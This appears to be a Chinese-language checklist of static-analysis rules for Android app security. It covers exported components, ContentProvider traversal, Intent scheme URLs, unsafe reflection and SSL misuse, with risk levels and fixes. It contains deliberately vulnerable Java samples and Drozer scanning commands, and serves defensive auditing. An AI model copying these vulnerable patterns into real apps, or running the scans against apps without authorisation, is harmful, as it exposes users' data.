<p>当API Level&gt;= 8时（其实小于8的API版本现在已经灭绝了），allowBackup这个标志被设置成true或<strong>不设置该标志位</strong>时，应用程序数据可以备份和恢复，adb调试备份允许恶意攻击者复制应用程序数据。</p>
<p>若要备份程序的数据，可以采用设置自动备份程序的参数<code>android:fullBackupContent=String</code>，并添加相应的规则进行限制，这个自动备份会将用户保留在设备中的数据自动上传至用户的Google Drive账户。在android 6.0引入的，使用方式如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.my.appexample&quot;</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">    ...</span><br><span class="line">	</span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span> <span class="attr">...</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/mybackupscheme&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>android:fullBackupContent</code>属性指定了一个 XML 文件。该文件名为mybackupscheme.xml，位于应用开发项目的 res/xml/ 目录中。 此配置文件包括关于要备份哪些文件的规则。 下列示例代码显示了将某一特定文件排除在备份之外的配置文件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">full-backup-content</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">domain</span>=<span class="string">&quot;database&quot;</span> <span class="attr">path</span>=<span class="string">&quot;device_info.db&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">full-backup-content</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="AndroidManifest-Debuggable检测">AndroidManifest Debuggable检测</h3>
<p>在AndroidManifest.xml中定义Debuggable项，如果该项被打开，app存在被恶意程序调试的风险，可能导致泄露敏感信息等问题。默认值 false</p>
<p>风险等级：<code>高危</code></p>
<h3 id="非必要权限检测">非必要权限检测</h3>
<p>检测在生产环境中不必要使用的权限</p>
<ul>
<li><code>android.permission.ACCESS_MOCK_LOCATION</code>该权限是使在模拟器中使用，用于获取模拟定位信息，安装在用户手机中的应用不应该申请该权限。</li>
</ul>
<p>风险等级：<code>提醒</code></p>
<h3 id="app最低版本检查">app最低版本检查</h3>
<p>罗列出跟最低版本相关的漏洞和bug，提醒开发者注意自己应用支持的最低版本的系统可能存在的问题</p>
<p>检测app/build.gradle中的minSdkVersion确定APP所支持的最低版本的系统API，对应到相应的Android版本上。</p>
<h2 id="组件安全检测">组件安全检测</h2>
<h3 id="Activity组件导出检测">Activity组件导出检测</h3>
<p>Activity组件对外暴露会导致数据泄露和恶意的dos攻击</p>
<p><strong>风险等级</strong>：提醒</p>
<p><strong>检测规则 ：</strong></p>
<ol>
<li>先检查组件的android:exported属性的值，若为true或者未设定该属性的值，则继续第二步操作；若为false，则是安全的</li>
<li>若组件含有标签，即使未设置exported属性，默认也会设置为true，若组件不含有标签，则未设置exported属性值，默认会设置为true，如果是false则是安全的，若是true，则进行第三步</li>
<li>判断android:permission属性的值，空，normal，dangerous是不安全的，signature、signatureOrSystem是安全的。</li>
</ol>
<p><strong>建议：</strong></p>
<ul>
<li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li>
<li>设置组件访问权限。对跨应用间调用的组件或者公开的receiver、service、activity和activity-alias设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li>
<li>组件传输数据验证。对组件之间，特别是跨应用的组件之间的数据传入与返回做验证和增加异常处理，防止恶意调试数据传入，更要防止敏感数据返回</li>
</ul>
<h3 id="service组件导出检测">service组件导出检测</h3>
<p>Service组件对外暴露会导致数据泄露和恶意的dos攻击。</p>
<p><strong>风险等级</strong>： <code>提醒</code></p>
<p>检测规则：</p>
<p>规则同1</p>
<p><strong>建议</strong>：</p>
<ul>
<li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li>
<li>设置组件访问权限。对跨应用间调用的组件或者公开的receiver、service、activity和activity-alias设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li>
<li>组件传输数据验证。对组件之间，特别是跨应用的组件之间的数据传入与返回做验证和增加异常处理，防止恶意调试数据传入，更要防止敏感数据返回</li>
</ul>
<h3 id="Receiver组件导出检测">Receiver组件导出检测</h3>
<p>Receiver组件对外暴露会导致数据泄露和恶意的dos攻击。</p>
<p>风险等级： <code>提醒</code></p>
<p>检测规则：</p>
<p>规则同1</p>
<p>建议：</p>
<ul>
<li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li>
<li>设置组件访问权限。对跨应用间调用的组件或者公开的receiver、service、activity和activity-alias设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li>
<li>组件传输数据验证。对组件之间，特别是跨应用的组件之间的数据传入与返回做验证和增加异常处理，防止恶意调试数据传入，更要防止敏感数据返回</li>
</ul>
<h3 id="Provider组件导出检测">Provider组件导出检测</h3>
<p>provider组件导出可能会带来信息泄露隐患。API Level在17以下的所有应用的<code>android:exported</code>属性默认值为true，17及以上默认值为false。</p>
<p>风险等级：<code>提醒</code></p>
<p>检测规则：</p>
<p>规则同1</p>
<p>建议：</p>
<ul>
<li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li>
<li>设置组件访问权限。对导出的provider组件设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li>
<li>由于contentprovider无法在android2.2（API-8）申明为私有。故建议将<code>minSdkVersion</code>设为8以上。</li>
</ul>
<h3 id="ContentProvider目录遍历漏洞检测">ContentProvider目录遍历漏洞检测</h3>
<p>该漏洞由于Content Provider组件暴露，没有对这个组件访问权限进行限制且对Uri路径没有进行过滤，攻击者通过Content Provider实现的OpenFile接口进行攻击，通过<code>../</code>的方式访问任意的目录文件，造成隐私泄露</p>
<p><strong>检测等级</strong>：提醒</p>
<p><strong>检测方法</strong>：</p>
<ol>
<li>找到导出的provider组件</li>
<li>使用Android安全分析框架Drozer动态分析APK，需要安装安卓模拟器（安装了<em>Genymotion</em>，基于X86 + ARM支持包）</li>
<li>、使用adb 进行端口转发，转发到Drozer使用的端口31415<br>
adb forward tcp:31415 tcp:31415</li>
<li>在安卓设备上开启Drozer Agent 在PC上启动Drozer<br>
<code>drozeer console connect</code></li>
<li>在Drozer控制台中使用命令，分析目标apk是否存在目录遍历漏洞<br>
<code>run scanner.provider.traversal -a &lt;package0-name&gt;</code></li>
</ol>
<p><strong>建议</strong>：</p>
<ul>
<li>
<p>将不必要的Connect Provider设置为不可导出</p>
</li>
<li>
<p>由于Android组件Content Provider无法在Android 2.2(API Level 8)系统上设置不可导出，因此如果希望Content Provider不可导出，建议声明的最低SDK版本为8以上版本；由于API Level 17以下的所有应用的<code>android:exported </code>默认值都为true，因此如果应用的Content Provider不必要导出，建议显示设置注册的Content Provider组件的<code>android:exported</code>属性为false；、</p>
</li>
<li>
<p>去除没有必要的OpenFile()接口</p>
</li>
<li>
<p>如果应用的Content Provider组件没有必要实现<code>openFile()</code>接口，阿里聚安全建议移除该Content Provider的不必要的<code>openFile()</code>接口</p>
</li>
<li>
<p>过滤限制跨域访问，对访问的目标文件的路径进行有效判断</p>
</li>
<li>
<p>使用<code>Uri.decode()</code>先对Content Query Uri进行解码后，在过滤如可通过<code>../</code>实现任意可读文件的访问的Uri字符串</p>
</li>
<li>
<p>设置权限来进行内部应用通过Content Provider的数据共享</p>
</li>
<li>
<p>使用签名验证来控制Content Provider共享数据的访问权限，如设置<code>protectionLevel=signature或signatureOrSystem</code></p>
</li>
<li>
<p>提供asset文件时注意权限保护</p>
</li>
<li>
<p>公开的content provider确保不存储敏感数据</p>
</li>
</ul>
<h3 id="Provider：grant-uri-permission属性检测">Provider：grant-uri-permission属性检测</h3>
<p>grant-uri-permission若设置为true，可被其他程序员通过uri访问到content provider内容，容易造成信息泄露，默认是false</p>
<p>如果一个Provider是非导出组件的时候，当进行文件共享的时候需要在Intent中加入Grant相关的flags</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_READ_URI_PERMISSION = <span class="number">0x00000001</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_WRITE_URI_PERMISSION = <span class="number">0x00000002</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_PERSISTABLE_URI_PERMISSION = <span class="number">0x00000040</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_PREFIX_URI_PERMISSION = <span class="number">0x00000080</span></span><br></pre></td></tr></table></figure>
<p>这样startActivity内部会判断，如果含有这些Grant flag，将会进行临时性的Uri授权，也包括临的将provider组件export给Intent的目标应用。</p>
<p><strong>风险等级</strong>：提醒</p>
<p><strong>问题实例：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">	...</span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>建议：</strong></p>
<p>如无需对外提供数据，则将content provider的<code>android:grantUriPermissions</code>设置为false。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">	...</span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Intent-Based攻击检测">Intent-Based攻击检测</h3>
<p>在AndroidManifest文件中定义了android.intent.category .BROWSABLE属性的组件，可以通过浏览器唤起，这会导致远程命令执行漏洞攻击</p>
<p><strong>风险等级</strong>：低危</p>
<p><strong>问题实例</strong>：Activity只有配置了category filter才有被android.intent.category.BROWSABLE通过这种方式在浏览器中打开。通过扫描Manifest中的所有组件，检测出所有组件中的intent-filter带有<code>&lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;</code>属性的，将其标注为问题代码代码段，并报出低危风险的提示。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>建议</strong>：</p>
<ul>
<li>app中任何接收外部输入数据的地方都是潜在的攻击点，<strong>检查并过滤</strong>来自网页的参数</li>
<li>不要通过网页传输敏感信息，有的网站为了引导已经登录用户到app上使用，会使用脚本动态的生成URL Scheme的参数，其中包括用户名，密码或者登录态token登敏感信息，让用户打开app直接就登录了，恶意应用也可以注册相同的URL Scheme来截取这些敏感信息，Android系统会让用户选择使用哪一个应用打开链接，但是如果用户不注意，就会使用恶意应用打开，导致敏感信息泄露或者其他风险。</li>
</ul>
<h3 id="Intent-Scheme-URL漏洞攻击">Intent Scheme URL漏洞攻击</h3>
<p>Intent Scheme URL是一种特殊的URL格式，用来通过web页面启动已经安装应用的Activity组件，大多数主流浏览器都支持此功能。</p>
<p>Android Browser的攻击手段 ==》Intent Scheme URLs攻击。这种攻击方式利用了浏览器保护措施不足，通过浏览器作为桥梁间接实现Intent-Based攻击。相比于普通的Intent-Based攻击，这种方式具有隐蔽性。</p>
<p>如果app中，没有检查获取到的load_url的值，攻击者可以构造钓鱼网站，诱导用户点击加载，就可以盗取用户信息。所以，对Intent URI的的处理不当时，就会导致基于Intent的攻击</p>
<p><strong>风险等级</strong>：高危</p>
<p><strong>问题实例</strong>：</p>
<p>如果浏览器支持Intent Scheme URI语法，一般会分三个步骤进行处理</p>
<ol>
<li>利用Intent.parseUri解析uri，获取原始的Intent对象</li>
<li>对intent对象设置过滤规则</li>
<li>通过Context.startActivityIfNeeded或者Context.startActivity发送intent，其中第二步起关键作用，过滤规则缺失或者存在缺陷都会导致Intent Scheme URL攻击</li>
</ol>
<p>关键在于Intent.parseUri函数，比较安全的使用Intent Scheme URI方法是，如果使用了Intent.parseUri函数，获取的intent对象必须严格过滤，intent至少包含以下三个策略</p>
<ul>
<li>addCategory(“android.intent.category.BROWSABLE”)</li>
<li>setComponent(null)</li>
<li>setSelector(null)</li>
</ul>
<p>通过扫描出所有调用了Intent.parseUri方法的路径，并检测是否使用了上述三个策略，若都是用了则安全，否则高危</p>
<p>Intent.parseUri函数返回的Intent对象需要按照以下方式进行实现，才可以认为是安全的。</p>
<p><strong>建议</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将intent的URI(intent scheme URL)转换为intent对象</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> Intent.parseUri(uri);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止在没有设置可浏览的目录(BROWSABLE category)的时候启动活动</span></span><br><span class="line">intent.addCategory(<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止显式调用(explicit call)</span></span><br><span class="line">intent.setComponent(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止intent的选择器(selector)</span></span><br><span class="line">intent.setSelector(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过intent启动活动</span></span><br><span class="line">context.startActivityIfNeeded(intent, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="应用本地拒绝服务漏洞检测">应用本地拒绝服务漏洞检测</h3>
<p>Android系统提供了Activity，Service，Broadcast Receiver等组件，并且提供了Intent机制来协助应用间的交互和通讯，Intent负责对应用中一次操作的动作，动作设计的数据，附加数据进行描述，Andorid系统根据此Intent的描述，负责找到对应的组件，将Intent传递给调用的组件，并完成组件的调用。</p>
<p>Andorid应用本地拒绝服务漏洞源于程序没有对Intent.GetxxxExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据，异常或者畸形数据来达到使该应用Crash的目的，简单的说就是攻击者通过Inent发送的空数据，异常或者畸形数据给受害者应用，导致其崩溃</p>
<p>**风险等级：**低危</p>
<p><strong>问题实例</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源于程序没有对getAction()等获取到的数据进行空指针判断，从而导致了空指针异常导致应用崩溃</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (i.getAction().equals(<span class="string">&quot;TestForNullPointerException&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;Test for Android Refuse Service Bug&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> Exception &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">abc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">Intent</span> <span class="variable">kkk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="keyword">if</span> (abc.getAction().equals(<span class="string">&quot;TestForNullPointerException&quot;</span>)) &#123;</span><br><span class="line">    Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;Test for Android Refuse Service Bug&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//源于程序没有对getSerializableExtra()等获取到的数据进行类型判断而进行强制类型转换，从而导致类型转换异常导致拒绝服务漏洞</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">a</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> (String) a.getSerializableExtra(<span class="string">&quot;serializable_key&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> Exception &#123;</span><br><span class="line">    <span class="comment">//针对异常进行操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//源于程序没有对getIntegerArrayListExtra()等获取到的数据数组元素大小判断，导致数组访问越界而造成拒绝服务漏洞</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"></span><br><span class="line">ArrayList&lt;Integer&gt; intArray = intent.getIntegerArrayListExtra(<span class="string">&quot;user_id&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (intArray != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        intArray.get(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//源于程序没有找到从getSerializableExtra()获取到的序列化对象的类定义，因此导致发生类未定义的异常导致拒绝服务漏洞</span></span><br><span class="line">a.getSerializableExtra(<span class="string">&quot;key&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="manifest中定义组件为实现检测">manifest中定义组件为实现检测</h3>
<p>在manifest文件中定义的组件导出，且没有代码实现，则攻击者可以通过ddos攻击导致app崩溃</p>
<p>**风险等级：**中危</p>
<p><strong>问题实例：</strong></p>
<p>首先获取app源码中所有类的路径(包名+类名)，然后检测manifest中声明的所有组件是否存在于类路径中即可</p>
<p><strong>建议：</strong></p>
<p>删除manifest文件中无效的导出组件</p>
<h3 id="Debug或Test敏感测试组件泄露检测">Debug或Test敏感测试组件泄露检测</h3>
<p>一些app在正式发布之前，为了方便调试app，都会在app里集成一些调式或者测试界面，这些测试界面可能包含敏感信息。</p>
<p>**风险等级：**低危或中危</p>
<p><strong>问题实例</strong></p>
<p>遍历manifest文件中所有组件的名称，找出所有带有debug或者test等测试字样的关键字组件，并根据组件的intent-filter属性构造intent发送让组件弹出进行检测</p>
<p><strong>建议</strong></p>
<p>正式发布前移除所有测试组件</p>
<h3 id="Intent不安全反射风险检测">Intent不安全反射风险检测</h3>
<p>通过Intent接收的Extra参数来构造反射对象会导致从不受信任的源加载类，攻击者可以通过巧妙地构造达到加载其他类的目的、</p>
<p>**风险等级：**低危</p>
<p><strong>问题实例</strong></p>
<p>Step1：检测出导出的组件</p>
<p>Step2：在导出的组件下，检测两个关键函数，分别是：getIntent()和Class.forName(“…”)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecondActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">		<span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_second);</span><br><span class="line">		<span class="comment">//这里的intent使用了getStringExtra方法加载了一个名称为className的类</span></span><br><span class="line">		<span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">		<span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Class&lt;?&gt; clz = <span class="literal">null</span>;</span><br><span class="line">			<span class="comment">//尝试以反射的方式构造className的实例</span></span><br><span class="line"> 			clz = Class.forName(className);</span><br><span class="line">			<span class="type">Date</span> <span class="variable">object</span> <span class="operator">=</span> (Date) clz.newInstance();</span><br><span class="line">			<span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clz.getMethod(methodName);</span><br><span class="line">			Toast.makeText(getApplicationContext(), method.invoke(object, <span class="literal">null</span>) + <span class="string">&quot;======&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逆向后对应的smali代码如下：</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.</span>..<span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;p0&#125;, <span class="class">Lcom/bug/intent/reflection/SecondActivity;</span>-&gt;getIntent()<span class="class">Landroid/content/Intent;</span></span><br><span class="line"><span class="keyword">.</span>..<span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-static </span>&#123;v0&#125;, <span class="class">Ljava/lang/Class;</span>-&gt;forName(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Class;</span></span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure>
<p><strong>建议：</strong></p>
<ul>
<li>不要通过Intent接收的Extra传播的反射函数</li>
<li>将接受反射的组件设置为非导出组件</li>
</ul>
<h2 id="WebView组件安全">WebView组件安全</h2>
<h2 id="SQLite安全">SQLite安全</h2>
<h2 id="网络通信安全">网络通信安全</h2>
<h3 id="SSL连接检测">SSL连接检测</h3>
<p>URL没有使用SSL安全协议</p>
<p>**风险等级：**提示</p>
<p>问题实例：</p>
<p>所有不使用https的url字符串常量</p>
<p><strong>建议</strong>：</p>
<ul>
<li>如果使用https协议加载url，应用进行证书校验，防止访问的页面被篡改挂马</li>
<li>如果使用http协议加载url，应进行白名单过滤，完整性校验等防止访问的页面被篡改</li>
<li>如果加载本地html，应将html文件内置在apk中，以及进行对html页面完整性的校验</li>
</ul>
<h3 id="SSL不安全组件检测">SSL不安全组件检测</h3>
<p>SSLCertificateSocketFactory#getInsecure方法无法执行SSL验证检查，使得网络通信遭受中间人攻击。</p>
<p>**风险等级：**提示</p>
<p><strong>问题示例：</strong></p>
<p>检测是否使用了SSLCertificateSocketFactory#getInsecure方法</p>
<p><strong>建议</strong>：</p>
<p>移除SSLCertificateSocketFactory#getInsecure方法</p>
<h3 id="HttpHost检测">HttpHost检测</h3>
<p><code>HttpHost target = new HttpHost(uri.getHost(), uri.getPort(), HttpHost.DEFAULT_SCHEME_NAME);</code></p>
<p>HttpHost.DEFAULT_SCHEME_NAME默认是http，不安全。</p>
<p><strong>问题示例：</strong></p>
<p>检测HttpHost使用的参数是否是<code>http</code></p>
<p><strong>建议</strong>：</p>
<p>改成使用<code>https</code></p>
<h3 id="HttpURLConnection漏洞检测">HttpURLConnection漏洞检测</h3>
<p>在<code>Android 2.2</code>版本之前，HttpURLConnection一直存在着一些令人厌烦的bug。比如说对一个可读的InputStream调用close()方法时，就有可能会导致连接池失效了。</p>
<p><strong>风险等级</strong>：<code>低危</code></p>
<p><strong>问题示例：</strong></p>
<p>判断使用HttpURLConnection是否进行了版本判断</p>
<p><strong>建议</strong>：</p>
<p>判断Android版本，并设置http.keepAlive为false。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">disableConnectionReuseIfNecessary</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 解决Android Froyo(Androdi 2.2)版本之前，在HTTP连接重用时会出现的BUG</span></span><br><span class="line">    <span class="keyword">if</span> (Integer.parseInt(Build.VERSION.SDK) &lt; Build.VERSION_CODES.FROYO) &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;http.keepAlive&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="网络端口开放威胁检测">网络端口开放威胁检测</h3>
<p>Android应用通常使用PF_UNIX，PF_INET，PF_NETLINK等不同domain的socket来进行本地IPC或者远程网络通信，这些暴露在socket代表了潜在的本地或者远程攻击面，历史上也出现过不少利用socket进行拒绝服务，root提权或者远程命令执行的案例，特别是PF_INET类型的网络socket，可以通过网络与Android应用通信，其原本用于linux环境下开放网络服务，由于缺乏对网络调用者身份或者本地调用者id，permission等细粒度的安全检查机制，在实现不当的情况下，可以突破Android沙箱限制，以被攻击应用的权限执行命令，通常出现比较严重的漏洞</p>
<p>**风险等级：**低危</p>
<p><strong>建议</strong></p>
<p>直接传递命令字或者间接处理有敏感信息或操作时，避免使用socket实现，使用身份认证，鉴权，参数校验等安全要素。</p>
<h2 id="弱加密风险检测">弱加密风险检测</h2>
<h3 id="DES弱加密算法风险检测">DES弱加密算法风险检测</h3>
<p>安全性要求高的应用程序必须避免使用不安全的或者强度弱的加密算法。例如，数据加密标准算法DES(密钥默认是56位，算法半公开，迭代次数少)是极度不安全的。</p>
